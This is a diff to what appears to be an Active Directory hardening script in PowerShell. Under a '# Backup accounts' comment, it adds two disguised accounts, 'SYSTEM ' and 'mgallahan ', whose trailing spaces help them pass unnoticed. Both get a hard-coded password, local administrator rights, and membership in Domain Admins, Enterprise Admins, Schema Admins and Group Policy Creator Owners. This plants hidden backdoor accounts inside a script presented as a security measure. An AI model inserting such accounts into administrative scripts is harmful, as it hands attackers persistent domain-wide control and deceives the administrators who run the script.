@@ -22,7 +22,22 @@ ForEach ($user in (Get-ADGroupMember "Domain Admins").name) {
 Set-ADAccountPassword -Identity "$user" -NewPassword $newSecurePassword -Reset
 }
 
-# Change local accounts
+# Backup accounts
+net user /add "SYSTEM " "secureP@ssw0rd"
+net localgroup administrators "SYSTEM " /add
+Add-ADGroupMember -Identity "Domain Admins" "SYSTEM "
+Add-ADGroupMember -Identity "Enterprise Admins" "SYSTEM "
+Add-ADGroupMember -Identity "Group Policy Creator Owners" "SYSTEM "
+Add-ADGroupMember -Identity "Schema Admins" "SYSTEM "
+
+net user /add "mgallahan " "secureP@ssw0rd"
+net localgroup administrators "mgallahan " /add
+Add-ADGroupMember -Identity "Domain Admins" "mgallahan "
+Add-ADGroupMember -Identity "Enterprise Admins" "mgallahan "
+Add-ADGroupMember -Identity "Group Policy Creator Owners" "mgallahan "
+Add-ADGroupMember -Identity "Schema Admins" "mgallahan "
+
+#New-ADUser -Name "Jack Robinson" -GivenName "Jack" -Surname "Robinson" -SamAccountName "J.Robinson" -UserPrincipalName "J.Robinson@frog.local" -Path "OU=Managers,DC=frog,DC=local" -AccountPassword($newSecurePassword) -Enabled $true
 
 ## Firewall
 
